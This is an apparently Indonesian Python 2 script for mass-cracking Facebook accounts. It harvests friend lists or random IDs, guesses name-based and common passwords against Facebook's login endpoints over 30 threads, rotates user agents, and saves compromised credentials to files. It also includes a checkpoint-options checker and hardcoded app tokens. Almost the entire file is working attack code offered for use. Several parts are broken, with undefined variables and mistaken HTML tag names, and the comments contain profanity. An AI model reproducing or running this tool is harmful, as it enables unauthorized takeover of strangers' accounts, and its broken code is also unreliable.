#!/usr/bin/python2
# -*- coding: utf-8
# code by : Khamdihi

# Module import
import os, sys, re, time, requests, calendar, random,json
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from datetime import datetime
from datetime import date
s=requests.Session()
reload(sys)
sys.setdefaultencoding("utf-8")

P = '\x1b[1;97m' # PUTIH               
M = '\x1b[1;91m' # MERAH            
H = '\x1b[1;92m' # HIJAU.              
K = '\x1b[1;93m' # KUNING.           
B = '\x1b[1;94m' # BIRU.                 
U = '\x1b[1;95m' # UNGU.               
O = '\x1b[1;96m' # BIRU MUDA.     
N = '\x1b[0m'    # WARNA MATI     

loop = 0
id = []
ok = []
cp = []

ct = datetime.now()
n = ct.month
bulann = ['Januari','Februari','Maret','April','Mei','Juni','Juli','Agustus','September','Oktober','Nopember','Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulann[nTemp]
my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
tanggal = ("%s-%s-%s-%s"%(hr, ha, op, ta))
tgl = ("%s %s %s"%(ha, op, ta))
bulan = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)

def buatfolder():
	try:os.mkdir("CP")
	except:pass
	try:os.mkdir("OK")
	except:pass


def setting_ua():
	print("\n[1] Change User-Agent")
	print("[2] Default User-Agent")
	ua = raw_input("\n[?] Choose : ")
	if ua =="":
		menu()
	elif ua == "1":
		c_ua = raw_input(" [+] Enter User-Agent : ")
		open("ua", "w").write(c_ua)
		time.sleep(1)
		raw_input("\n [!] Press Enter To Save User-Agent")
		menu()

	elif ua == "2":
		print("\n Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36")
		os.system("rm -f ua")
		time.sleep(1)
		raw_input("\n[•] User-Agent Save Successfully")
		menu()


def baner():
    print('''
 _    _   _  ___  ___ 
| |  | \_/ || o )| __| || Code by : Khamdihi xd
| |_ | \_/ || o \| _|  || Versi   : 2.32
|___||_| |_||___/|_|   || status  : elite\n''')


# Data mbasic
IP = requests.get('https://api.ipify.org').text
ua = ('Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 GSA/13.1.16.23.arm64')
mbasic_h={"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
free_h={"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
mfb_h={'Host': 'm.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent':ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}

def login():
    os.system('clear');baner()
    toket = raw_input('[?] Masukan token : ')
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
        a = json.loads(otw.text)
        nama = a['name']
        zedd = open("login.txt", 'w')
        zedd.write(toket)
        zedd.close()
        os.system('xdg-open https://youtube.com/channel/UCOqxx2kjYPypVct2l81Y1Jw')
        menu()
    except KeyError:
        print(" [x] Token Salah lol")
        time.sleep(1.7)
        login()
    except requests.exceptions.SSLError:
        exit(' [x] Koneksi Error lol')

def menu():
  try:
    toket = open('login.txt','r').read()
    otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
    a = json.loads(otw.text)
    nm = a['name']
    id = a['id']
    tl = a['birthday']
  except Exception as e:
    print('[x] Token Invalid')
    time.sleep(3)
    login()
  except KeyError:
    print('[x] Token Invalid')
    time.sleep(3)
    os.system('rm -rf login.txt')
    login()
  except requests.exceptions.ConnectionError:
    exit('[x] Koneksi Error')
  os.system("clear")
  baner()
  print('[✓] Welcome  : '+(nm))
  print('[✓] Ip adres : '+(IP))
  print('')
  print('[1]. Crack dari teman/publik ')
  print('[2]. Crack acoount masal')
  print('[3]. Crack acoount old')
  print('[4]. Crack account new')
  print('[5]. Seting user-agent')
  print('[6]. Cek opsi chekpoint')
  print('[0]. exit -*- hapus token ')
  nu = raw_input('\n[*] Chose menu : ')
  if nu == '':
     jalan('\n[+] Silakan pilih menu')
     time.sleep(2)
     menu()
  elif nu in ['1','01']:
     publik()
     sandi()
  elif nu in ['2','02']:
     massal()
     sandi()
  elif nu in ['3','03']:
     fbtua()
     sandi()
  elif nu in ['4','04']:
     fbbaru()
     sandi()
  elif nu in ['5','05']:
     setting_ua()
  elif nu in ['6','06']:
     cekopsi()
  elif nu in ['0','00']:
     os.system('rm -rf login.txt')
     exit()
  else:
     print('\n[×] Pilih salah satu menu');time.sleep(2)
     menu()



def fbbaru():
	x = 11111111111
	xx = 77777777777
	idx = "5000" 
	limit = int(input("[+] masukan jumlah id (cth 5000): "))
	try:
		for n in range(limit):
			_ = random.randint(x,xx)
			__ = idx
			id.append(__+"<=>"+str(_))
	except KeyError:
		exit("[×] akun tidak mersedia atau error")
	print("\n[+] mtotal id  :\x1b[1;92m %s%s%s"%(M,len(id),N))
	
def massal():
	global token
	try:
		token = open("login.txt", "r").read()
	except IOError:
		exit(" [!] token kadaluwarsa")
	try:
		tanya_total = int(raw_input('[*] Masukan jumlah id : '))
	except:tanya_total=1
	print("[+] Ketik (me) Jika ingin crack from frinds")
	for t in range(tanya_total):
		t +=1
		idt = raw_input("[?] id target %s : "%(t))
		try:
			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
				uid = i["id"]
				nama = i["name"]
				id.append(uid+"<=>"+nama)
		except KeyError:
			print("[!] ups id ini tidak publik : "+(idt))
	print("\n[×] total id : %s%s%s"%(M,len(id),N))
	
def publik():
	global token
	try:
		token = open("login.txt", "r").read()
	except IOError:
		exit(" [!] token kadaluwarsa")
		time.sleep (0.01)
		print
	print("[*] Ketik (me) untuk crack dari frinds")
	time.sleep (0.01)
	idt = raw_input("[*] Masukan id target : ")
	try:
		for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
			id.append(i["id"]+"<=>"+i["name"])
	except KeyError:
		exit("[!] Id ini privat : "+(idt))
	print("\n[×] Total id : %s%s%s"%(M,len(id),N)) 

def sandi():
    nun = raw_input('[*] Ingin gunakan password otomatis y/t : ')
    if nun == '':
       print('[!] Tidak ad di dalam kata');exit()
    elif nun in ['y','Y']:
       otomatis()
    elif nun in ['t','T']:
       manual()
    else:
       print('[*] Anak ngentod pilih y/t bukan -> '+(nun))
       sandi()


def manual():
	print("\n[*] Masukan sandi minim 6 buat koma untuk pemisahan")
	pwek=raw_input('\n[?] Masukan password : ')
	print('[*] Crack dengan passowrd -> [ %s%s%s ]' % (M, pwek, N))
	if pwek=="":
		exit(" %s[×] Isi yang bener "%(M))
	elif len(pwek)<=5:
		time.sleep (0.01)
		exit(" %s[!] Masukan sandi minim (6) kata/angka"%(M))
	print("\n[*] Pake metode mobile 50% dapet (OK)\n")
	print("[1]. Metode api -> Hasil coba sendiri + fast")
	print("[2]. Metode Mbasic -> selow")
	print("[3]. Metode mobile -> Selow Rekomendasi")
	ask=raw_input("\n[*] Chose metode : ")
	print
	if ask=="":
		exit(" %s[!] isi jawaban dengan benar!"%(M))
	elif ask=="1":
		time.sleep (0.01)
		print('\n[+] hasil OK disimpan ke -> OK/%s.txt' % (tanggal))
		print('[+] hasil CP disimpan ke -> CP/%s.txt' % (tanggal))
		print('[!] Mode pesawat jika tidak ada hasil\n')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				fall.submit(nunu, user, pwek.split(","))
		exit("\n\n\x1b[1;97m [#] crack selesai...")
	elif ask=="2":
		time.sleep (0.01)
		print('\n[+] hasil OK disimpan ke -> OK/%s.txt' % (tanggal))
		print('[+] hasil CP disimpan ke -> CP/%s.txt' % (tanggal))
		print('[*] Mode pesawat jika tidak ada hasil\n')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				fall.submit(mbasic, uid, pwek.split(","),"https://mbasic.facebook.com")
		exit("\n\n\x1b[1;97m [#] crack selesai...")
	elif ask=="3":
		time.sleep (0.01)
		print('\n[+] hasil OK disimpan ke -> OK/%s.txt' % (tanggal))
		print('[+] hasil CP disimpan ke -> CP/%s.txt' % (tanggal))
		print('[*] Mode pesawat jika tidak ada hasil\n')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				fall.submit(khamdihi, user, pwek.split(","),"https://m.facebook.com")
		exit("\n\n \x1b[1;97m[#] crack selesai...")

def otomatis():
	time.sleep (0.01)
	print("\n[!] Silaka  pilih metode yang di rekomendasi\n")
	print("[1]. Metode b-apii   -> Fast ")
	print("[2]. Metode mbasic   -> slow  rekomendasi")
	print("[3]. Metode mobile   -> Selow rekomendasi")
        print("[4]. Metode mobilev2 -> slow  full rekomendasi")
        print("[5]. Metode B-Apiiv2 -> Fast")
        print("[6]. Metode mbasicv2 -> Rekomendasi slow")
	ask=raw_input("\n[*] Chose Method : ")
	if ask=="":
		exit(" %s[!] isi jawaban dengan benar!"%(M))
	elif ask=="1":
		time.sleep (0.01)
		print('\n[+] hasil OK disimpan ke -> OK/%s.txt' % (tanggal))
		print('[+] hasil CP disimpan ke -> CP/%s.txt' % (tanggal))
		print('[+] Mode pesawat jika tidak ada hasil\n')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5 or len(name) == 6:
					pwx = [name, nam[0]+"123", nam[0]+"12345",nam[0]+"1234",nam[0]+"123456", "sayang", "kontol", "anjing"]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"12345",nam[0]+"1234",nam[0]+"123456", "sayang", "kontol", "anjing"]
				fall.submit(api, uid, pwx)
		exit("\n\n\x1b[1;97m [*] crack selesai...")
	elif ask=="2":
		time.sleep (0.01)
		print('\n[+] hasil OK disimpan ke -> OK/%s.txt' % (tanggal))
		print('[+] hasil CP disimpan ke -> CP/%s.txt' % (tanggal))
		print('[!] mode pesawat jika tidak ad hasil\n')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5 or len(name) == 6:
					pwx = [name, nam[0]+"123", nam[0]+"12345",nam[0]+"1234",nam[0]+"123456", "sayang", "kontol", "anjing"]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"12345",nam[0]+"1234",nam[0]+"123456", "sayang", "kontol", "anjing"]
				fall.submit(mbasicv2, uid, pwx)
		exit("\n\n [*] \x1b[1;97mcrack selesai...")
	elif ask=="3":
		time.sleep (0.01)
		print('\n[+] hasil OK disimpan ke -> OK/%s.txt' % (tanggal))
		print('[+] hasil CP disimpan ke -> CP/%s.txt' % (tanggal))
		print('[!] mode pesawat jika tidak ada hasil\n')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5 or len(name) == 6:
					pwx = [name, nam[0]+"123", nam[0]+"12345",nam[0]+"1234",nam[0]+"123456", "sayang", "kontol", "anjing"]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"12345",nam[0]+"1234",nam[0]+"123456", "sayang", "kontol", "anjing"]
				fall.submit(mobile, uid, pwx)
		exit("\n\n\x1b[1;97m [#] crack selesai...")
		
	elif ask=="4":
		time.sleep (0.01)
		print('\n[+] hasil OK disimpan ke -> OK/%s.txt' % (tanggal))
		print('[+] hasil CP disimpan ke -> CP/%s.txt' % (tanggal))
		print('[×] Mode pesawat jika tidak ada hasil')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5 or len(name) == 6:
					pwx = [name, nam[0]+"123", nam[0]+"12345",nam[0]+"1234",nam[0]+"123456", "sayang", "kontol", "anjing"]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"12345",nam[0]+"1234",nam[0]+"123456", "sayang", "kontol", "anjing"]
				fall.submit(khamdihi,user) # mobile
		exit("\n\n\x1b[1;97m [#] crack selesai...")

	elif ask=="5":
		time.sleep (0.01)
		print('\n[+] hasil OK disimpan ke -> OK/%s.txt' % (tanggal))
		print('[+] hasil CP disimpan ke -> CP/%s.txt' % (tanggal))
		print('[*] Mode pesawat jika tidak ada hasil\n')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5 or len(name) == 6:
					pwx = [name, nam[0]+"123", nam[0]+"12345",nam[0]+"1234",nam[0]+"123456", "sayang", "kontol", "anjing"]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"12345",nam[0]+"1234",nam[0]+"123456", "sayang", "kontol", "anjing"]
				fall.submit(_khamdihi_, user)
		exit("\n\n\x1b[1;97m [#] crack selesai...")
		
	elif ask=="6":
		time.sleep (0.01)
		print('\n[+] hasil OK disimpan ke -> OK/%s.txt' % (tanggal))
		print('[+] hasil CP disimpan ke -> CP/%s.txt' % (tanggal))
		print('\n[*] Mode pesawat jika tidak ada hasil\n')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5 or len(name) == 6:
					pwx = [name, nam[0]+"123", nam[0]+"12345",nam[0]+"1234",nam[0]+"123456", "sayang", "kontol", "anjing"]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"12345",nam[0]+"1234",nam[0]+"123456", "sayang", "kontol", "anjing"]
				fall.submit(nunu, user)
		exit("\n\n [#] \x1b[1;97mcrack selesai...")

def _khamdihi_(user):
	try:
		ua = open(".ua", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
	global loop, token
	sys.stdout.write(
		"\r[Crack] %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	uid, name = user.split("<=>")
	if len(name)>=6:
		pwx = [ name, name+"123", name+"1234", name+"12345" ]
	elif len(name)<=2:
		pwx = [ name+"123", name+"1234", name+"12345" ]
	elif len(name)<=3:
		pwx = [ name+"123", name+"12345" ]
	else:
		pwx = [ name+"123", name+"12345" ]
	try:
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
			send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
			if "session_key" in send.text and "EAAA" in send.text:
				print("\r\033[0;94m[NA1M-OK] %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "www.facebook.com" in send.json()["error_msg"]:
				print("\r\033[0;95m[FLAME-CP] %s|%s\033[0;92m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
		loop += 1
	except:
		pass

def cekopsi():
	dirs = os.listdir("CP")
	print("")
	for file in dirs:
		print(" [◉] CP/"+file)
	print("\n[?] masukan file (ex: CP/%s.txt)"%(tanggal))
	files = raw_input("[?] nama file  : ")
	if files == "":
		menu()
	try:
		buka_baju = open(files, "r").readlines()
	except IOError:
		exit("\n [!] nama file %s tidak tersedia"%(files))
	print('\n [!] anda bisa mematikan data selular untuk menjeda proses cek\n')
	for memek in buka_baju:
		kontol = memek.replace("\n","")
		titid  = kontol.split("|")
		print("\n [+] cek : %s%s%s"%(K,kontol.replace("  * --> ",""),N))
		try:
			check_in(titid[0].replace("  * --> ",""), titid[1])
		except requests.exceptions.ConnectionError:
			pass
	print("\n \x1b[1;92m[\x1b[1;91m!\x1b[1;92m] \x1b[1;93mcek akun \x1b[1;92msudah selesai...")
	raw_input(" \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] \x1b[1;93menter untuk k\x1b[1;92membali ke menu ")
	time.sleep(1)
	menu()
	
def check_in(user, pasw):
	mb = ("https://mbasic.facebook.com")
	ua = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'
'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11'
'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36'
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)'
'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'
'NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)'
'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2'
'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 5.1.1; Navori QL Stix 3500 Build/LMY49F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Safari/537.36'

])
	ses = requests.Session()
	#-> pemisah
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("raw_input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":user,"pass":pasw})
	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	if "c_user" in ses.cookies:
		kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
		run = parser(ses.get("https://free.facebook.com/settings/apps/tabbed/", cookies={"cookie":kuki}).text, "html.parser")
		xe = [re.findall("\<span.*?href=\".*?\">(.*?)<\/a><\/span>.*?\<div class=\".*?\">(.*?)<\/div>", str(td)) for td in run.find_all("td", {"aria-hidden":"false"})][2:]
		print(" [+] aplikasi terhubung ada : "+str(len(xe)))
		num = 0
		for _ in xe:
			num += 1
			print("   "+str(num)+" "+_[0][0]+", "+_[0][1])
	elif "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("raw_input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("raw_input",{"name":"jazoest"})["value"]
		nh   = form.find("raw_input",{"name":"nh"})["value"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		if "Lihat detail login yang ditampilkan. Ini Anda?" in str(xnxx):
			print("\r  🌟 %sTinggal 1 langkah lagi untuk membuka akun facebook. silahkan buka di browser%s"%(H,N))
		else:
			print(" [+] terdapat "+str(len(ngew))+" opsi ")
			for opt in range(len(ngew)):
				print("  ["+str(opt+1)+"] "+ngew[opt])
	elif "login_error" in str(run):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print(" [!] %s"%(oh))
	else:
		print(" [!] login gagal, silahkan cek kembali id dan kata sandi")



def api(uid, pwx):
	global ok, cp, loop, token
	sys.stdout.write(
		"\r%s[✓] [crack] %s/%s\x1b[1;92m OK:-%s - \x1b[1;93mCP:-%s "%(N,loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in pwx:
		pw = pw.lower()
		ua = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'
'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11'
'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36'
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)'
'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'
'NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)'
'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2','Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 GSA/13.1.16.23.arm64'

])
		headers = ({
			'Authorization': 'OAuth 350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
			'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)),
			'x-fb-sim-hni': str(random.randint(20000, 40000)),
			'x-fb-net-hni': str(random.randint(20000, 40000)),
			'x-fb-connection-quality': 'EXCELLENT',
			'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
			'content-type': 'application/x-www-form-urlencoded',
			'user-agent': ua,
			'x-fb-http-engine': 'Liger'
		})
		params = {
			'format': 'JSON',
			'sdk_version': '2',
			'email': str(uid),
			'locale': 'en_US',
			'password': str(pw),
			'sdk': 'ios',
			'generate_session_cookies': '1',
			'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
		}
		status_masuk = requests.get("https://b-api.facebook.com/method/auth.login",headers=headers,params=params) 
		file_jason = json.loads(status_masuk.text)
		if "Calls to this api have exceeded the rate limit. (613)" in file_jason:
			t=15
			while t:
				mins, secs = divmod(t, 60)
				sys.stdout.write("\r %s[!] aktifkan mode janda selama 5 detik%s"%(M,N))
				sys.stdout.flush()
				sleep(1.5)
				t -= 1
		elif "session_key" in status_masuk.text and "EAAA" in status_masuk.text:
			print("\r  %s\x1b[1;92m[OK] -> %s|%s|%s"%(H,uid, pw, send.json()["access_token"]))
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.txt"%(tanggal),"a").write("   > %s|%s\n"%(uid, pw))
			break
		elif "User must verify their account on www.facebook.com (405)" in status_masuk.text:
			try:
				token=open("token.txt","r").read()
				ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
				month, day, year = ttl.split("/")
				month = bulan[month]
				print("\r  %s\x1b[1;93m[CP] -> %s|%s|%s %s %s"%(K,uid, pw, day, month, year))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tanggal),"a").write("   > %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
				break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print("\r  %s\x1b[1;93m[CP] %s|%s         "%(K,uid, pw))
			cp.append("%s|%s"%(uid, pw))
			open("CP/%s.txt"%(tanggal),"a").write("   > %s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1

def mbasic(uid, pwx):
	global ok, cp, loop, token
	sys.stdout.write(
		"\r[crack] %s/%s\x1b[1;92m OK:-%s - \x1b[1;93mCP:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in pwx:
		pw = pw.lower()
		ua = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'
'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11'
'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36'
